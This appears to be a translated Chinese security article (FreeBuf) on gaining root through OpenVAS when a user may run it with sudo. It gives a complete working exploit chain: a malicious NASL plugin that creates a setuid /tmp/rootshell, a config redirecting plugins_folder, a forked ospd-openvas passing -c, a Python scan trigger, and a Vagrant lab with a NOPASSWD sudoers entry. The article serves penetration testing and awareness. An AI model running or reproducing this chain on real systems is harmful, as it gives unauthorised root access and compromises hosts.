@@ -1,0 +1,292 @@
+**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**![](https://image.3001.net/images/20210329/1617033083_6061f77b2e60acb73ade0.png!small)
+
+## 写在前面的话
+
+虽然本文涉及到的并非一个常见的场景，但如果在渗透测试过程中，你可以通过一个拥有sudo权限的用户来执行OpenVAS的话，你就可以利用本文介绍的技术来实现提权并拿到root。
+
+在这篇文章中，我们将介绍ixie关于OpenVAS工作流的内容，然后深入探讨如何利用其中存在的问题实现本地权限提升。
+
+## OpenVAS工作流背景知识
+
+OpenVAS是目前最流行的漏洞扫描工具之一。当你在安装OpenVAS时，你拿到的只是OepnVAS（https://github.com/greenbone/openvas-scanner）的源码，而不是一个随时可以使用的可执行程序。你还需要两外两个额外组件：
+
+> 一个实现了OSP协议（https://github.com/greenbone/ospd/）的项目，比如说ospd-> openvas（https://github.com/greenbone/ospd-openvas）。
+>
+> 一个类似python-gvm（https://python-gvm.readthedocs.io/）的代码库，可以提供编程接口并允许通过ospd-> openvas和使用OSP会话来跟OpenVAS进行交互。
+
+![](https://image.3001.net/images/20210329/1617033093_6061f7852c06def0e33b1.png!small)
+
+根据python-gvm的文档，我们得到了下列样本代码（#id8）：
+
+![](https://image.3001.net/images/20210329/1617033099_6061f78b41cc5ad9e5d09.png!small)
+
+这是执行OpenVAS最简单也最轻量级的工作流了。当然了，也有其他的工作流实践方式，但可能会涉及到虚拟机或更加复杂的组件。
+
+回到我们的演示示例上，为了成功运行前面的代码段，我们必须能够与ospd-openvas（一个Unix
+Socket）进行通信。为了实现这一点，我们可以设置Socket权限（#L55），或者使用我们的用户身份运行ospd-openvas。
+
+除此之外，OpenVAS安装文档（https://github.com/greenbone/openvas-scanner/blob/master/INSTALL.md）中的一个重要建议（第5点）是关于以root用户身份运行OpenVAS的：
+
+请注意，尽管您可以以没有提升权限的用户身份运行OpenVAS，但建议您以root身份启动OpenVAS，因为许多网络漏洞测试需要root权限来执行某些操作，如数据包伪造等等。如果未经允许以用户身份运行OpenVAS来执行这些操作，则扫描结果可能不完整。
+
+因此，程序会建议用户以sudo权限运行ospd-openvas。比如说，在Ubuntu Groovy（20.10）上，专门有一个针对ospd-openvas的包，能够以_gvm用户运行该服务。_gvm用户将会使用sudo权限来调用OpenVAS。这个用户有nologin
+shell，因此我假设OpenVAS将会做以下事情：
+
+> 通过其他以_gvm身份运行的进程来调度。
+>
+> 通过一个能够fork以_gvm用户拥有进程的更高级别（比如说root）进程来调度。
+
+在我看来，这是一种运行OpenVAS的安全方法。
+
+根据我的个人实现OpenVAS工作流的经验，这里会有一些区别：
+
+> 所有涉及到的软件包都有一致的版本（即8.1https://github.com/greenbone/openvas-> scanner/releases），因此您可以手动升级以获得最新的特性。
+>
+> 操作系统软件包有点过时或者不存在（在04中ospd-openvas不存在），所以用户必须构建自己的软件包，这就需要定制运行的用户和权限。
+>
+> 扫描可能会卡住或无法完成，因此您需要围绕OpenVAS提供一些监控解决方案。
+>
+> 还有其他很多的协议（https://python-> gvm.readthedocs.io/en/latest/api/protocols.html）可以与OpenVAS交互。
+
+最后，有几种方法可以实现OpenVAS工作流，这些工作流可以在不同的permission/ownership方案中派生，并允许最终用户拥有sudo权限来执行OpenVAS。作为渗透测试人员，对我们来说重要的是要知道，如果我们有一个Shell作为一个拥有sudo权限的用户来执行OpenVAS，我们可以将权限升级到root，那我们走这条路吧！
+
+## 千里之行始于足下
+
+现在，我们的用户拥有sudo权限来执行OpenVAS，OpenVAS代码中一个有趣的功能就是可以使用-c选项在运行时修改配置信息。下图中，我演示了如何使用-s选项来显示配置信息：
+
+![](https://image.3001.net/images/20210329/1617033116_6061f79c6a985b7bc37d5.png!small)
+
+在研究了不同配置信息之后，我了解了如何去利用它们。
+
+OpenVAS代码会从设置中定义的plugins_folder路径来加载插件，那如果我能在运行时将该目录指向一个存储了恶意插件的目录，是不是就可以让OpenVAS执行扫描的时候运行我们的恶意代码呢?
+
+## 漏洞利用
+
+为了利用这个提权漏洞，首先我们要在目录/tmp/plugins中创建一个恶意插件：
+
+    
+    
+    if(description)
+    
+    {
+    
+      script_oid("1.2.3.4.5");
+    
+      script_tag(name:"last_modification", value:"2021-03-21 12:22:31 +0100 (Sun, 21 Mar 2021)");
+    
+      script_tag(name:"creation_date", value:"2021-03-21 12:22:31 +0100 (Sun, 21 Mar 2021)");
+    
+      script_tag(name:"cvss_base", value:"0.0");
+    
+      script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:N");
+    
+      script_name("Malicious");
+    
+      script_category(ACT_SCANNER);
+    
+      script_family("Port scanners");
+    
+     
+    
+      exit(0);
+    
+    }
+    
+     
+    
+    args = make_list("cp", "/bin/dash", "/tmp/rootshell");
+    
+    ret = pread(cmd:"cp", argv: args, cd: FALSE);
+    
+    args = make_list("chmod", "+s", "/tmp/rootshell");
+    
+    ret = pread(cmd:"chmod", argv: args, cd: FALSE);
+    
+     
+    
+    exit( 0 );
+
+这个恶意NASL插件将会在被执行的时候创建一个rootshell（第15-18行）。请记住代码中第3行声明的插件ID
+1.2.3.4.5，因为我们之后会用到。除此之外，对于一个有效的plugins_folder，它必须包含一个名为plugin_feed_info.inc的文件，其中需要包含有效的date字符串：
+
+    
+    
+    PLUGIN_SET = "202006091543"
+
+接下来，我们需要在/tmp/openvas.conf路径下创建我们的恶意配置文件，它将会通过-c选项提供给OpenVAS：
+
+    
+    
+    plugins_folder = /tmp/plugins
+    
+    db_address = /tmp/redis-server.sock
+
+它负责引用我们的恶意插件目录，并指向一个Redis Socket（OpenVAS使用了一个Redis数据库来存储某些扫描信息）。在Ubuntu
+Groovy中，Redis（https://redis.io/）实例需要先进行实例化，而且有严格的权限限制：
+
+![](https://image.3001.net/images/20210329/1617033139_6061f7b3ddf93a23017f0.png!small)
+
+为此，我开启了一个自己的Redis实例来监听/tmp/redis-server.sock，并将其设置在我的恶意配置中。
+
+下一步很重要，我们需要运行ospd-openvas来跟OpenVAS通信。官方ospd-openvas项目（https://github.com/greenbone/ospd-openvas）会使用sudo调用OpenVAS，但并没有设置-c选项。所以我创建了一个fork（https://github.com/csalazar/ospd-openvas），并添加了指向我们恶意配置的-c选项：
+
+![](https://image.3001.net/images/20210329/1617033146_6061f7ba385e7987ba16b.png!small)
+
+在我的漏洞利用场景中，我将会使用下列配置信息运行我的fork：
+
+    
+    
+    [OSPD - openvas]
+    
+    log_level = INFO
+    
+    socket_mode = 0o770
+    
+    unix_socket = /tmp/ospd-openvas.sock
+    
+    pid_file = /tmp/ospd-openvas.pid
+    
+    log_file = /tmp/ospd-openvas.log
+    
+    lock_file_dir = /tmp
+
+这个配置主要用于在/tmp/ospd-openvas.sock创建一个ospd-openvas Socket，这样我就可以控制它了。
+
+最后一步就是触发扫描任务了，这里我使用了下列脚本：
+
+    
+    
+    import os
+    
+    import uuid
+    
+     
+    
+    from gvm.connections import UnixSocketConnection
+    
+    from gvm.protocols.latest import Osp
+    
+     
+    
+    def run_openvas():
+    
+        path = "/tmp/ospd-openvas.sock"
+    
+        connection = UnixSocketConnection(path=path)
+    
+        osp = Osp(connection=connection)
+    
+     
+    
+        # Prepare scan data
+    
+        MALICIOUS_PLUGIN_ID = "1.2.3.4.5"
+    
+        vts = {MALICIOUS_PLUGIN_ID: {}}
+    
+        targets = [{"hosts": "localhost", "ports": "22"}]
+    
+     
+    
+        with osp:
+    
+            scan_id = str(uuid.uuid4())
+    
+            osp.start_scan(scan_id=scan_id, targets=targets, vt_selection=vts)
+
+我们一起看看上述代码会做什么事情：
+
+> 第8行引用了我的ospd-openvas Socket；
+>
+> 第14行添加了需要运行的恶意插件；
+>
+> 第19行调用了扫描任务；
+
+如果一切正常的话，我们就可以在/tmp/rootshell拿到一个root shell了！
+
+## 执行漏洞利用方案
+
+为了方便大家在一个隔离环境中进行测试，我提供了一个样本Vagrantfile 来从runner用户实现提权：
+
+    
+    
+    $script = <<-SCRIPT
+    
+    apt update && apt install python3-venv openvas-scanner -y
+    
+    adduser --gecos "" --disabled-password runner
+    
+    chpasswd <<<"runner:password123"
+    
+    echo "runner ALL = NOPASSWD: /usr/sbin/openvas" >> /etc/sudoers
+    
+    SCRIPT
+    
+     
+    
+    Vagrant.configure("2") do |config|
+    
+      config.vm.box = "ubuntu/groovy64"
+    
+      config.vbguest.auto_update = false
+    
+      config.vm.provision "shell", inline: $script
+    
+    end
+
+这里要求安装python-gvm（https://python-gvm.readthedocs.io/en/latest/）和我fork的ospd-openvas（https://github.com/csalazar/ospd-openvas），我已经使用了一个虚拟环境来封装它们了：
+
+    
+    
+    python3 -m venv env
+    
+    source ./env/bin/activate
+    
+     
+    
+    pip install python-gvm
+    
+    pip install git+https://github.com/csalazar/ospd-openvas.git
+
+现在你就可以执行漏洞利用代码（https://gist.github.com/csalazar/4ef0a379b7564861e0838220aef7c2e3）了。
+
+## 漏洞利用演示视频
+
+视频地址：https://asciinema.org/a/jbug3QkTogoWPMUikXTshwveN
+
+## 参考资料
+
+https://www.openvas.org/
+
+https://github.com/greenbone/openvas-scanner
+
+https://github.com/greenbone/ospd/
+
+https://github.com/greenbone/ospd-openvas
+
+https://python-gvm.readthedocs.io/
+
+https://python-gvm.readthedocs.io/en/latest/usage.html#id8
+
+https://github.com/greenbone/ospd-openvas/blob/53157d788d691f8cb5eb25c66b1ce7dfdb416971/docs/ospd-openvas.8#L55
+
+https://github.com/greenbone/openvas-scanner/blob/master/INSTALL.md
+
+https://launchpad.net/ubuntu/groovy/+package/ospd-openvas
+
+https://github.com/greenbone/openvas-scanner/releases
+
+https://python-gvm.readthedocs.io/en/latest/api/protocols.html
+
+https://redis.io/
+
+https://github.com/csalazar/ospd-openvas
+
+https://github.com/greenbone/python-gvm/blob/master/tests/protocols/osp/test_osp_start_scan.py
+
+https://gist.github.com/csalazar/4ef0a379b7564861e0838220aef7c2e3
+
+https://asciinema.org/a/jbug3QkTogoWPMUikXTshwveN
+
+https://security.stackexchange.com/questions/185442/is-it-possible-to-invoke-os-commands-from-a-nasl-script-in-openvas
+
